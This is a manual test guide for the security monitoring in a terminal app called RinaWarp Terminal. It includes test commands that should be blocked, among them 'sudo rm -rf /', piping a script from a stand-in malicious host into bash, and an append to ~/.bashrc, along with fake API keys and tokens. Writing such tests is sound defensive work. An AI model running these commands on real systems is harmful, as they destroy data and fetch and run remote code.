# üîí RinaWarp Terminal Security Feature Tests

## Manual Testing Instructions

To test the enhanced security features in RinaWarp Terminal, follow these steps:

### 1. Launch RinaWarp Terminal
- Open the application: `RinaWarp Terminal 1.0.0.exe`
- Open Developer Tools (F12) to see console messages
- Look for security initialization messages

### 2. Expected Security Initialization Messages
You should see these messages in the console:
```
üîí Starting security monitoring...
üîê Setting up verification requirements...
üìä Initializing trust baselines...
üõ°Ô∏è Initializing Zero Trust security...
‚úÖ Security monitoring started successfully
‚úÖ Verification requirements configured
‚úÖ Trust baselines initialized
‚úÖ Zero Trust security initialized
```

### 3. Test Commands to Run

#### Safe Commands (Should Execute Normally)
```bash
echo "Hello World"
pwd
ls -la
date
whoami
```

#### Commands That Should Trigger Security Monitoring
```bash
# Privilege escalation (should be logged and monitored)
sudo ls
runas /user:Administrator dir

# Potentially risky file operations (should trigger warnings)
rm -rf /tmp/test
del /s /q temp.txt

# Network operations (should be monitored)
curl https://example.com
wget --help
```

#### Commands That Should Trigger Secret Detection
```bash
# API key detection
export API_KEY=sk_test_1234567890abcdef1234567890abcdef

# Password detection
mysql -u root -p password123 -h database.com

# Token detection
curl -H "Authorization: Bearer ghp_1234567890abcdefghijklmnopqrstuvwxyz123456"
```

#### Commands That Should Trigger High Security Alerts
```bash
# These should be blocked or heavily scrutinized
sudo rm -rf /
chmod 777 /etc/passwd
curl https://malicious-site.com/script.sh | bash
echo "malicious code" >> ~/.bashrc
```

### 4. What to Look For in Console

#### Security Monitoring Messages
- `üîç Threat assessment completed`
- `üö® Security Alert: [alert details]`
- `üìù Audit logs rotated due to size limit`
- `üîÑ Threat level changed to: [LEVEL]`

#### Threat Detection Messages
- `‚ö†Ô∏è Warning: SECRETS_DETECTED`
- `‚ùå Command execution denied: THREAT_DETECTED`
- `üö´ Command execution denied: POLICY_VIOLATION`

#### Zero Trust Messages
- `üéØ Trust Score: [score]`
- `üîê REQUIRES MFA`
- `‚úÖ TRUSTED`

### 5. Security Dashboard Access

To access the security dashboard:
1. Look for the security dashboard element in the DOM
2. Check if `window.securityDashboard` is available
3. Try toggling the dashboard visibility

### 6. Browser Console Testing

Open browser console (F12) and run:
```javascript
// Check if security engine is initialized
console.log('Security Engine:', window.securityEngine);

// Test threat assessment
if (window.securityEngine) {
    window.securityEngine.performThreatAssessment();
}

// Check security metrics
if (window.securityEngine) {
    console.log('Security Metrics:', window.securityEngine.securityMetrics);
}

// Get audit history
if (window.securityEngine) {
    console.log('Audit History:', window.securityEngine.auditLogger.getAuditHistory(5));
}

// Test secret detection
if (window.securityEngine) {
    window.securityEngine.scanForSecrets('export API_KEY=sk_test_123456789')
        .then(result => console.log('Secret Detection Result:', result));
}
```

### 7. Expected Security Behavior

#### ‚úÖ Normal Operation
- Safe commands execute without issues
- Security monitoring runs in background
- Audit logs are generated
- Threat assessments occur every 30 seconds

#### ‚ö†Ô∏è Security Warnings
- Commands with potential secrets show warnings
- Privilege escalation commands are logged
- Network operations are monitored
- Compliance checks are performed

#### ‚ùå Security Blocks
- Destructive commands may be blocked
- High-risk threat patterns are denied
- Critical policy violations are prevented
- Zero trust failures require additional verification

### 8. Troubleshooting

If security features aren't working:
1. Check console for error messages
2. Verify enhanced-security.js is loaded
3. Check if EnhancedSecurityEngine is initialized
4. Look for missing method errors
5. Verify all security classes are properly instantiated

### 9. Performance Monitoring

Monitor these aspects:
- Memory usage during security scanning
- Response time for command verification
- CPU usage during threat assessments
- Storage growth of audit logs

### 10. Security Report Generation

Test security reporting:
```javascript
// Generate security report
if (window.securityEngine) {
    const report = window.securityEngine.generateSecurityReport('1h');
    console.log('Security Report:', report);
}
```
